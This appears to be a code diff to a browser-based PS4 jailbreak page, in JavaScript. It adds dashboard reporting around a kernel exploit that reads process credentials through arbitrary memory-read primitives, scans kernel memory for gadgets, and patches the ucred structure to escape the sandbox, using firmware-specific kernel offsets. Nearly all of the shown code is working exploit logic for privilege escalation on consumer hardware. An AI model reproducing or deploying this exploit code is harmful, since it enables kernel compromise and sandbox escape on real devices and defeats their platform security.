-                PROBE.structs.proc0.ucred = ucred;
+                setRow("evf", "pid",   hex(pid));
+                setRow("evf", "ucred", hex(ucred));
                 mark("PROC0-PID",   hex(pid));
                 mark("PROC0-UCRED", hex(ucred));
+
                 if (ucred > 0xffff000000000000n && ucred < 0xffffffffffffffffn) {
-                    var uid    = read64(ucred + 0x04n);
-                    var gid    = read64(ucred + 0x08n);
-                    var prison = read64(ucred + 0x30n);
-                    PROBE.structs.proc0.uid = uid;
-                    PROBE.structs.proc0.gid = gid;
-                    PROBE.structs.proc0.prison = prison;
-                    mark("PROC0-UCRED-VALUES", "uid=" + hex(uid) + "-gid=" + hex(gid) + "-prison=" + hex(prison));
+                    var uid     = read64(ucred + 0x04n);
+                    var gid     = read64(ucred + 0x08n);
+                    var prison  = read64(ucred + 0x30n);
+                    var ngroups = read64(ucred + 0x10n);
+                    setRow("ucred", "addr",    hex(ucred));
+                    setRow("ucred", "uid",     hex(uid));
+                    setRow("ucred", "gid",     hex(gid));
+                    setRow("ucred", "prison",  hex(prison));
+                    setRow("ucred", "ngroups", hex(ngroups));
+                    setBadge("ucred", "OK", "ok");
+                    setCardState("ucred", "ok");
+                    mark("PROC0-UCRED-VALUES", "uid=" + hex(uid) + "-gid=" + hex(gid) + "-prison=" + hex(prison) + "-ngroups=" + hex(ngroups));
+                } else {
+                    setBadge("ucred", "INVALID", "warn");
+                    setCardState("ucred", "warn");
                 }
             } catch (e) {
+                setBadge("ucred", "ERR", "bad");
+                setCardState("ucred", "bad");
                 mark("PROC0-CHAIN-ERR", String(e && e.message).slice(0, 60));
-                PROBE.errors.push("PROC0-CHAIN " + (e && e.message));
             }
+        } else {
+            setBadge("ucred", "NO PROC", "warn");
+            setCardState("ucred", "warn");
         }
 
-        // -------- gadget scans --------
         var w1Base = (sy_call & ~0xFFFn) - 0x800n;
         if (w1Base < kbase) w1Base = kbase;
         dumpWindow("SCAN-SYCALL", w1Base, 0x1000);
@@ -1675,27 +1731,17 @@ function runProbe() {
             "-prison0=" + hex(prisonVal) +
             "-rootvnode=" + hex(rootVal));
 
-        PROBE.finished = Date.now();
         mark("===== KERNEL PROBE COMPLETE =====", "fw=" + FW_LABEL);
-        setStatus("halted", "R/W PROBE COMPLETE", "gadgets + kernel info in console");
-        maybeAutoSave();
-
-        // Emit .mjs modules.
-        if (LOG.autoMjs && !mjsSavedOnce) {
-            setTimeout(saveProbeMjs, 300);
-        }
+        setStatus("halted", "PROBE COMPLETE", "gadgets + kernel info on dashboard");
 
     } catch (err) {
-        PROBE.finished = Date.now();
-        PROBE.errors.push("PROBE-ERROR " + (err && err.message));
         mark("PROBE-ERROR", (err && err.name) + ":" + String(err && err.message).slice(0, 120));
-        if (LOG.autoMjs && !mjsSavedOnce) {
-            setTimeout(saveProbeMjs, 300);
-        }
     }
 }
 
-// ========== PS4 JAILBREAK (opt-in via ?jb=1) ==========
+/* ============================================================
+ *  PS4 JAILBREAK (opt-in via ?jb=1)
+ * ============================================================ */
 function runJailbreak() {
     mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);
 
@@ -1767,6 +1813,7 @@ function runJailbreak() {
         if (!sandboxEscaped) {
             var sigStart = proc - 0x4000n;
             var sigEnd = proc + 0x4000n;
+            var sigFound = 0n;
             for (var s = sigStart; s < sigEnd && !sandboxEscaped; s += 8n) {
                 try {
                     var ref = Number(read64(s) & 0xFFFFFFFFn);
@@ -1778,6 +1825,7 @@ function runJailbreak() {
                     if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(s) + "-ref=" + ref + "-groups=" + ngroups);
                     if (patchAndVerifyUcred(s, prisonVal)) {
                         sandboxEscaped = true;
+                        sigFound = s;
                         mark("UCRED-SIG-FOUND", hex(s));
                         mark("SANDBOX-ESCAPE", "success");
                         mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
@@ -1786,18 +1834,6 @@ function runJailbreak() {
             }
             if (!sandboxEscaped) {
                 mark("SANDBOX-ESCAPE", "FAILED-not-found");
-                if (dbgMode) {
-                    var dump = "";
-                    for (var d = 0; d < 0x100; d += 16) {
-                        var ln = hex(proc + BigInt(d)) + ": ";
-                        for (var c = 0; c < 16; c++) {
-                            var b = Number(read64(proc + BigInt(d + c)) & 0xFFn);
-                            ln += (b < 16 ? "0" : "") + b.toString(16);
-                        }
-                        dump += ln + "\n";
-                    }
-                    mark("PROC-DUMP", dump.trim());
-                }
             }
         }
 
@@ -1827,7 +1863,9 @@ function runJailbreak() {
     }
 }
 
-// ========== SINGLE-SHOT ENTRY ==========
+/* ============================================================
+ *  SINGLE-SHOT ENTRY
+ * ============================================================ */
 var attemptSucceeded = false;
 
 function runAttempt() {
@@ -1841,32 +1879,33 @@ function runAttempt() {
     }
 }
 
-// ========== UI WIRING ==========
-(function initUI() {
-    try {
-        document.getElementById("btnDownload").addEventListener("click", downloadLog);
-        document.getElementById("btnSaveMjs").addEventListener("click", function () {
-            if (!PROBE.finished) PROBE.finished = Date.now();
-            saveProbeMjs();
-        });
-        document.getElementById("btnCopy").addEventListener("click", copyLog);
-        document.getElementById("btnClear").addEventListener("click", clearLog);
-        document.getElementById("chkAutoScroll").addEventListener("change", function (ev) {
-            LOG.autoScroll = !!ev.target.checked;
-        });
-        document.getElementById("chkAutoSave").addEventListener("change", function (ev) {
-            LOG.autoSave = !!ev.target.checked;
-        });
-        document.getElementById("chkAutoMjs").addEventListener("change", function (ev) {
-            LOG.autoMjs = !!ev.target.checked;
-        });
-    } catch (_) {}
-})();
+/* ============================================================
+ *  BOOT
+ * ============================================================ */
+buildDashboard();
 
 try {
     document.getElementById("toolbarMeta").textContent =
-        "rev " + REVISION + " · fw " + (FW_LABEL || "?") + " · post " + (RUN_JAILBREAK ? "JB" : "PROBE") + " · mjs on";
+        "rev " + REVISION + " · fw " + (FW_LABEL || "?") + " · post " + (RUN_JAILBREAK ? "JB" : "PROBE");
 } catch (_) {}
+
+(function seedFirmwareCard() {
+    setRow("fw", "label", FW_LABEL || "(undetected)", FW_LABEL ? "ok" : "warn");
+    setRow("fw", "ua",    navigator.userAgent);
+    setRow("fw", "rev",   REVISION);
+    if (FW_LABEL && fwOffsets) {
+        setRow("fw", "off-evf",     "0x" + fwOffsets.evf.toString(16));
+        setRow("fw", "off-prison0", "0x" + fwOffsets.prison0.toString(16));
+        setRow("fw", "off-root",    "0x" + fwOffsets.rootvnode.toString(16));
+        setRow("fw", "off-sysent",  "0x" + fwOffsets.sysent.toString(16));
+        setRow("fw", "off-jmp",     "0x" + fwOffsets.jmp.toString(16));
+        setBadge("fw", "OK", "ok");
+        setCardState("fw", "ok");
+    } else {
+        setBadge("fw", "UNKNOWN", "warn");
+        setCardState("fw", "warn");
+    }
+})();
 
 runAttempt();
 </script>
